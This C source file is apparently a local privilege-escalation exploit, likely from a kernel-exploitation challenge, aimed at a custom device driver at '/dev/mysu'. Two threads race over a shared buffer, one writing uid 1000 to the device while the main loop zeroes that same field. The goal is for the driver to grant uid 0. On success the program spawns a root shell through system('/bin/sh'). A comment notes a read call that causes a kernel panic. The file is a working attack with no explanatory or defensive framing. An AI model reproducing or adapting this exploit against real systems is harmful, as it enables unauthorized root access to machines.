#include <fcntl.h>
#include <stdio.h>
#include <assert.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <stdbool.h>

const int BUF_SIZE = 0x20;

int fd = -1;
char buf_in[8] = "\xe8\x03\x00\x00\x6e\x63\x7b\x89";

bool is_root = false;

void *race_thread(void* p)
{
    while (1) {
		*((int*)&buf_in) = 0x3e8;
		int w = write(fd, buf_in, sizeof(buf_in));

		uid_t curr_uid = getuid();
		if (curr_uid == 0) {
			is_root = true;
			printf("[+] Got root! Spawning shell... \n");
			system("/bin/sh");
			return NULL;
		}
	}

    return NULL;
}

// void print_bytes(void *ptr, int size)
// {
//     unsigned char *p = ptr;
//     int i;
//     for (size_t i = 0; i < size; i++) {
//         printf("%02hhX ", p[i]);
//     }
//     printf("\n");
// }

int main() {
    fd = open("/dev/mysu", O_WRONLY);
	assert (fd > 0);

	printf("[+] Device '/dev/mysu' is opened\n");

	//char buf_out[BUF_SIZE];
	//int sz = read(fd, buf_out, BUF_SIZE);

	// kernel panic
	// int sz = read(fd, 0x0, BUF_SIZE);
	//assert (sz > 0);

	//printf("[*] Read n-bytes: %x\n", sz);
	//print_bytes(buf_out, BUF_SIZE);

	pthread_t t1;
    pthread_create(&t1, NULL, race_thread, NULL);
	printf("[+] T1 created\n");

	while (1) {
		*((int*)&buf_in) = 0;
		if (is_root) {
			pthread_join(t1, NULL);
			break;
		}
	}

	close(fd);

    return 0;
}